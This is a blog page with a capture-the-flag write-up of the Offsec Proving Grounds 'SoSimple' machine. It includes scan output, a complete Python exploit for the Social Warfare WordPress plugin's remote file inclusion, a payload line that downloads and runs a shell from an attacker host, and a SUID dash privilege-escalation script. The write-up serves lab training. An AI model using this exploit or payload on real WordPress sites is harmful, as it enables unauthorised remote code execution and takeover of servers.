@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>Proving grounds Play: SoSimple</title>
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Proving grounds Play: SoSimple | Thevillagehacker’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Proving grounds Play: SoSimple" />
+<meta name="author" content="Naveen" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Offsec proving grounds play linux machine writeup" />
+<meta property="og:description" content="Offsec proving grounds play linux machine writeup" />
+<link rel="canonical" href="http://localhost:4000/2023/07/22/Proving_grounds_Play-SoSimple.html" />
+<meta property="og:url" content="http://localhost:4000/2023/07/22/Proving_grounds_Play-SoSimple.html" />
+<meta property="og:site_name" content="Thevillagehacker’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-07-22T12:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Proving grounds Play: SoSimple" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Naveen"},"dateModified":"2023-07-22T12:00:00+05:30","datePublished":"2023-07-22T12:00:00+05:30","description":"Offsec proving grounds play linux machine writeup","headline":"Proving grounds Play: SoSimple","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/07/22/Proving_grounds_Play-SoSimple.html"},"url":"http://localhost:4000/2023/07/22/Proving_grounds_Play-SoSimple.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<script type="text/javascript" src="/assets/js/darkmode.js"></script>
+
+</head><body>
+  <main class="container">
+    <section class="about">
+      <div class="about-header condensed">
+      <div class="about-title">
+      <a href="/">
+        
+        <img src="/assets/portfolio.jpg" alt="Naveen Jagadeesan" />
+        
+      </a>
+      <h2 id="title">
+        <a href="/">Naveen Jagadeesan</a>
+      </h2>
+      </div><p class="tagline">Security Analyst. Security Researcher</p></div>
+      
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/2023/07/22/Proving_grounds_Play-SoSimple.html">
+    <h2 class="post-title">Proving grounds Play: SoSimple</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Jul 22, 2023</div></div>
+  <div class="post">
+    <h2 id="walkthrough-on-youtube">Walkthrough on Youtube</h2>
+
+<p><a href="https://youtu.be/KodURDujWxs"><img src="/assets/images/CTF/Proving_Grounds/SoSimple/youtube.png" alt="youtube" /></a></p>
+
+<h2 id="nmap">NMAP</h2>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 5b5543efafd03d0e63207af4ac416a45 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 53f5231be9aa8f41e218c6055007d8d4 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 55b77b7e0bf54d1bdfc35da1d768a96b <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: So Simple
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="fuzzing-for-directories-and-files">Fuzzing for directories and Files</h2>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://192.168.158.78/FUZZ/
+Total requests: 62284
+
+<span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload                               
+<span class="o">=====================================================================</span>
+
+000000327:   200        147 L    646 W      13420 Ch    <span class="s2">"wordpress"</span>                           
+000000386:   403        9 L      28 W       279 Ch      <span class="s2">"icons"</span>                               
+000004227:   403        9 L      28 W       279 Ch      <span class="s2">"server-status"</span>                       
+000004255:   200        77 L     39 W       495 Ch      <span class="s2">"http://192.168.158.78//"</span>             
+000010756:   404        9 L      31 W       276 Ch      <span class="s2">"secure_html"</span>
+</code></pre></div></div>
+
+<h2 id="wpscan">WPScan</h2>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+] social-warfare
+ | Location: http://192.168.158.78/wordpress/wp-content/plugins/social-warfare/
+ | Last Updated: 2023-02-15T16:23:00.000Z
+ | <span class="o">[!]</span> The version is out of <span class="nb">date</span>, the latest version is 4.4.1
+</code></pre></div></div>
+
+<h3 id="searchsploit">Searchsploit</h3>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/SoSimple/searchsploit.png" alt="img" /></p>
+
+<h3 id="exploit">Exploit</h3>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">re</span>
+<span class="kn">import</span> <span class="n">urlparse</span>
+<span class="kn">import</span> <span class="n">optparse</span>
+
+<span class="k">class</span> <span class="nc">EXPLOIT</span><span class="p">:</span>
+
+	<span class="n">VULNPATH</span> <span class="o">=</span> <span class="sh">"</span><span class="s">wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=%s</span><span class="sh">"</span>
+
+	<span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">_t</span><span class="p">,</span> <span class="n">_p</span><span class="p">):</span>
+		<span class="n">self</span><span class="p">.</span><span class="n">target</span>  <span class="o">=</span> <span class="n">_t</span>
+		<span class="n">self</span><span class="p">.</span><span class="n">payload</span> <span class="o">=</span> <span class="n">_p</span>
+
+	<span class="k">def</span> <span class="nf">engage</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+		<span class="n">uri</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">.</span><span class="nf">urljoin</span><span class="p">(</span> <span class="n">self</span><span class="p">.</span><span class="n">target</span><span class="p">,</span> <span class="n">self</span><span class="p">.</span><span class="n">VULNPATH</span> <span class="o">%</span> <span class="n">self</span><span class="p">.</span><span class="n">payload</span> <span class="p">)</span>
+		<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span> <span class="n">uri</span> <span class="p">)</span>
+		<span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span><span class="p">:</span>
+			<span class="k">print</span> <span class="sh">"</span><span class="s">[*] Received Response From Server!</span><span class="sh">"</span>
+			<span class="n">rr</span>  <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>
+			<span class="n">obj</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">^(.*)&lt;\!DOCTYPE</span><span class="sh">"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span> <span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">lnbreak</span><span class="sh">"</span> <span class="p">))</span>
+			<span class="k">if</span> <span class="n">obj</span><span class="p">:</span>
+				<span class="n">resp</span> <span class="o">=</span> <span class="n">obj</span><span class="p">.</span><span class="nf">groups</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
+				<span class="k">if</span> <span class="n">resp</span><span class="p">:</span>
+					<span class="k">print</span> <span class="sh">"</span><span class="s">[&lt;] Received: </span><span class="sh">"</span>
+					<span class="k">print</span> <span class="n">resp</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span> <span class="sh">"</span><span class="s">lnbreak</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="se">\n</span><span class="sh">"</span> <span class="p">)</span>
+				<span class="k">else</span><span class="p">:</span>
+					<span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="sh">"</span><span class="s">[&lt;] Nothing Received for the given payload. Seems like the server is not vulnerable!</span><span class="sh">"</span><span class="p">)</span>
+			<span class="k">else</span><span class="p">:</span>
+				<span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="sh">"</span><span class="s">[&lt;] Nothing Received for the given payload. Seems like the server is not vulnerable!</span><span class="sh">"</span><span class="p">)</span>
+		<span class="k">else</span><span class="p">:</span>
+			<span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span> <span class="sh">"</span><span class="s">[~] Unexpected Status Received!</span><span class="sh">"</span> <span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+	<span class="n">parser</span> <span class="o">=</span> <span class="n">optparse</span><span class="p">.</span><span class="nc">OptionParser</span><span class="p">(</span>  <span class="p">)</span>
+
+	<span class="n">parser</span><span class="p">.</span><span class="nf">add_option</span><span class="p">(</span> <span class="sh">'</span><span class="s">-t</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--target</span><span class="sh">'</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="sh">"</span><span class="s">target</span><span class="sh">"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="sh">""</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="sh">"</span><span class="s">string</span><span class="sh">"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">"</span><span class="s">Target Link</span><span class="sh">"</span> <span class="p">)</span>
+	<span class="n">parser</span><span class="p">.</span><span class="nf">add_option</span><span class="p">(</span> <span class="sh">''</span>  <span class="p">,</span> <span class="sh">'</span><span class="s">--payload-uri</span><span class="sh">'</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="sh">"</span><span class="s">payload</span><span class="sh">"</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="sh">""</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="sh">"</span><span class="s">string</span><span class="sh">"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">"</span><span class="s">URI where the file payload.txt is located.</span><span class="sh">"</span> <span class="p">)</span>
+
+	<span class="p">(</span><span class="n">options</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
+
+	<span class="k">print</span> <span class="sh">"</span><span class="s">[&gt;] Sending Payload to System!</span><span class="sh">"</span>
+	<span class="n">exploit</span> <span class="o">=</span> <span class="nc">EXPLOIT</span><span class="p">(</span> <span class="n">options</span><span class="p">.</span><span class="n">target</span><span class="p">,</span> <span class="n">options</span><span class="p">.</span><span class="n">payload</span> <span class="p">)</span>
+	<span class="n">exploit</span><span class="p">.</span><span class="nf">engage</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
+	<span class="nf">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Vulnerable PATH</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">VULNPATH</span> <span class="o">=</span> <span class="sh">"</span><span class="s">wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=%s</span><span class="sh">"</span>
+</code></pre></div></div>
+<h3 id="remote-file-inclusion">Remote File Inclusion</h3>
+
+<p><strong>Remote payload file</strong></p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;pre&gt;
+system("wget http://192.168.45.217:8000/shell  -O /var/tmp/shell; chmod 755 /var/tmp/shell; chmod +x /var/tmp/shell; /var/tmp/shell");
+&lt;/pre&gt;
+</code></pre></div></div>
+<h3 id="reverse-shell-payload-using-msfvenom">Reverse shell payload using msfvenom</h3>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/SoSimple/rev_shell.png" alt="img" /></p>
+
+<h3 id="rfi-exploitation">RFI Exploitation</h3>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/SoSimple/rfi.png" alt="img" /></p>
+
+<p><strong>Reverse shell connection obtained.</strong></p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>User <code class="language-plaintext highlighter-rouge">max</code> ssh id_rsa file has been found.</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/SoSimple/id_rsa.png" alt="img" /></p>
+
+<h3 id="ssh-login-to-max">SSH login to max</h3>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/SoSimple/max.png" alt="img" /></p>
+
+<p>Listing <code class="language-plaintext highlighter-rouge">max</code> user permission, finding exploit for the <code class="language-plaintext highlighter-rouge">service</code> using GTFO bins and switch user to <code class="language-plaintext highlighter-rouge">steven</code></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/SoSimple/steven.png" alt="img" /></p>
+
+<p>Listing <code class="language-plaintext highlighter-rouge">steven</code> user permisssions</p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/SoSimple/server-health.png" alt="img" /></p>
+
+<p>Create bash script using the location mentioned in the permissions.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nb">cp</span> /bin/dash /var/tmp/dash<span class="p">;</span> <span class="nb">chmod </span>u+s /var/tmp/dash
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">chmod u+s</code> Allows the binary to be executed as owner + SUID permissions.</p>
+
+<h3 id="running-script-as-root-user">Running script as root user</h3>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/SoSimple/dash.png" alt="img" /></p>
+
+<p><strong>Run</strong> <code class="language-plaintext highlighter-rouge">dash</code></p>
+
+<p><img src="/assets/images/CTF/Proving_Grounds/SoSimple/proof.png" alt="img" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">dash -p</code> preserves effective privilege with which it was created and executed with same privilege.</p>
+
+<p><strong>Root obtained.</strong></p>
+
+<p>Thanks for reading!</p>
+
+<p>For more insights and updates, follow me on Twitter: <a href="https://twitter.com/thevillagehackr">@thevillagehacker</a>.</p>
+
+  </div></div>
+
+    </section>
+    <footer class="condensed">
+      <ul class="social about-footer condensed"><a href="https://github.com/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a><a href="https://www.linkedin.com/in/thevillagehacker" target="_blank">
+          <li>
+            <i class="icon-linkedin-squared"></i>
+          </li>
+        </a><a href="https://twitter.com/thevillagehackr" target="_blank">
+          <li>
+            <i class="icon-twitter-squared"></i>
+          </li>
+        </a></ul><p class="about-footer condensed">&copy;
+        2024</p><div class="about-footer condensed">
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" class="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+    </footer>
+  </main>
+  
+  <script type="text/javascript" src="/assets/js/darkmode.js"></script>
+  
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
